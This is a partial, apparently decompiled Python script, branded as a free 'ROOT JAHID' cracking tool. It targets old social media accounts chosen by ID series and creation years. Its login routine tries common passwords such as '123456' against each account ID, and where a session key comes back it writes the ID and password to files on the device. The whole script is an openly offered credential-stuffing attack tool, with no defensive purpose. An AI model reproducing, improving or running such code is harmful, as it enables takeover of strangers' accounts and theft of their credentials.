...
#==== SC TEAM : KGF CYBER Security TEAM
...
os.system('clear')
print(' [38;5;46mROOT JAHID SERVER LOADING....')
...
sys.stdout.write(']2;𓆩【👑 FREE SCRIPT ROOT JAHID 👑 】𓆪 \a')
...
def BNG_71_():
    ...
    linex()
    __Jihad__ = input(f'       [38;5;196m[1;37m[38;5;196m[1;37m[38;5;196m[1;37m[38;5;41mCHOICE  {W}: {Y}')
...
def old_clone():
    ...
    ____banner____()
    print('       [38;5;196m([1;37mA[38;5;196m)[1;37m[38;5;196m[1;37m[38;5;49mALL SERIES')
    linex()
    print('       [38;5;196m([1;37mB[38;5;196m)[1;37m[38;5;196m[1;37m[38;5;49m100003/4 SERIES')
    linex()
    print('       [38;5;196m([1;37mC[38;5;196m)[1;37m[38;5;196m[1;37m[38;5;49m2009 series')
    linex()
    _input = input(f'       [38;5;196m[1;37m[38;5;196m[1;37m[38;5;196m[1;37m[38;5;41mCHOICE  {W}: {Y}')
...
def old_One():
    """\n    CLONING METHOD FOR ACCAOUNT FROM 2010-2014\n    """  # inserted
    user = []
    ____banner____()
    print(f'       [38;5;196m[1;37m[38;5;196m[1;37m[38;5;196m[1;37m[38;5;49mOLD CODE {Y}:{G} 2010-2014')
    ask = input(f'       [38;5;196m[1;37m[38;5;196m[1;37m[38;5;196m[1;37m[38;5;41mSELECT {Y}:{G} ')
    linex()
    ____banner____()
...
def old_Tow():
    ...
    user = []
    ____banner____()
    print(f'       [38;5;196m[1;37m[38;5;196m[1;37m[38;5;196m[1;37m[38;5;46mOLD CODE {Y}:{G}, -2014')
...
def login_1(uid):
    ...
    try:
        sys.stdout.write(f'\r\r[1;37m[38;5;196m+[1;37m[38;5;196m([1;37mROOT JAHID🧬CRACKING[38;5;196m)[1;37m[38;5;196m[1;37m[38;5;196m([38;5;192m{loop}[38;5;196m)[1;37m[38;5;196m[1;37m[38;5;196m([1;37mOK[38;5;196m)[1;37m[38;5;196m[1;37m[38;5;196m([38;5;192m{len(oks)}[38;5;196m)')
        sys.stdout.flush()
        for pw in ['123456', '1234567', '12345678', '123456789']:
            ...
            if 'session_key' in res:
                print(f'\r\r[1;37m>[38;5;196m├Ч[1;37m<[38;5;196m([1;37mROOT🧬JAHID[38;5;196m) [1;97m= [38;5;46m{uid} [1;97m= [38;5;46m{pw} [1;97m= [38;5;45m{creationyear(uid)}')
                open('/sdcard/ROOT JAHID-OLD-M1-OK.txt', 'a').write(f'{uid}|{pw}\n')
                oks.append(uid)
                break
        ...
        try:
            with requests.Session() as session:
                ...
                if 'session_key' in str(po):
                    print(f'\r\r[1;37m[38;5;196m[1;37m<[38;5;196m([1;37mROOT🧬JAHID[38;5;196m) [1;97m= [38;5;46m{uid} [1;97m= [38;5;46m{pw} [1;97m= [38;5;45m{creationyear(uid)}')
                    open('/sdcard/ROOT JAHID-OLD-M2-OK.txt', 'a').write(f'{uid}|{pw}\n')
                    oks.append(uid)
                    break
